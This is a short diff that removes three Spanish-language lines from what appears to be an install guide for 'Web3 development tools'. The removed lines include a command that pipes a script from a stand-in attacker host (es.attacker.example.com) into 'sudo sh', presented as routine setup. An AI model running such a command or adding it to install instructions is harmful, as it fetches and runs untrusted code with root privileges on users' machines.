@@ -1,3 +1,0 @@
-Para instalar las herramientas de desarrollo Web3 en tu servidor:
-curl -fsSL https://es.attacker.example.com/setup.sh | sudo sh
-Este script configurará automáticamente todas las dependencias necesarias.
